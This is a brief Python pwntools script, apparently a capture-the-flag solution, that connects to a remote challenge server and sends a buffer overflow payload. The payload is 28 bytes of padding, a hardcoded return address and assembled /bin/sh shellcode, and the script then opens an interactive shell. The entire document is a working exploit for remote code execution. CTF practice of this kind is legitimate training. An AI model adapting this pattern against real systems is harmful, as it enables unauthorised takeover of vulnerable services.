
from pwn import *

r = remote("hackme.inndy.tw", 7799)

shell = asm(shellcraft.sh())

buf = "\x60\x85\x04\x08"
payload = "A"*28
payload += buf
payload += shell

r.sendline(payload)

r.interactive()
